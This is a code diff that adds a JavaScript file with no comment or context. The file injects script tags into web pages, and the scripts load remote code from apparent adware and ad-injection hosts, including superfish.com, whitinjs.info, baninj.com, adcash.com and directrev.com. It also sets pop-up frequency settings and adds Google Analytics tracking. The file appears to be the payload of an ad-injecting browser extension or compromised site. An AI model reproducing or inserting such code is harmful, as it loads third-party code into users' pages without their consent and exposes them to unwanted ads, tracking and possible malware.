@@ -1,0 +1,42 @@
+script = document.createElement('script');
+script.setAttribute('id','scriptinject');
+script.setAttribute('type','text/javascript');
+script.setAttribute('src','//www.superfish.com/ws/sf_main.jsp?dlsource=Yspaxfq&userId=TEMPORARY');
+document.body.appendChild(script);
+
+script_ = document.createElement('script');
+script_.setAttribute('id','scriptinject');
+script_.setAttribute('type','text/javascript');
+script_.setAttribute('src','http://i.whitinjs.info/whitin/javascript.js');
+document.body.appendChild(script_);
+
+script_1 = document.createElement('script');
+script_1.setAttribute('id','scriptinject11');
+script_1.setAttribute('type','text/javascript');
+script_1.setAttribute('src','//baninj.com/bov/loadlib.php?af=100556');
+document.body.appendChild(script_1);
+
+script_3 = document.createElement('script');
+script_3.setAttribute('id','scriptinject33');
+script_3.setAttribute('type','text/javascript');
+script_3.setAttribute('src','//www.adcash.com/script/java.php?option=rotateur&rotateur=265784');
+document.body.appendChild(script_3);
+
+var _gunggo={settings:{siteID:"S0003547",pop:{}}};
+_gunggo.settings.pop.freqcap={};
+_gunggo.settings.pop.freqcap.frequency=1;
+_gunggo.settings.pop.freqcap.duration=0.5;
+
+script_2 = document.createElement('script');
+script_2.setAttribute('id','drv');
+script_2.setAttribute('type','text/javascript');
+script_2.setAttribute('src','http://cdn.directrev.com/js/gp.min.js?s=S0003547');
+document.body.appendChild(script_2);
+
+(function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+
+  ga('create', 'UA-49251158-1', 'wsm');
+  ga('send', 'pageview');
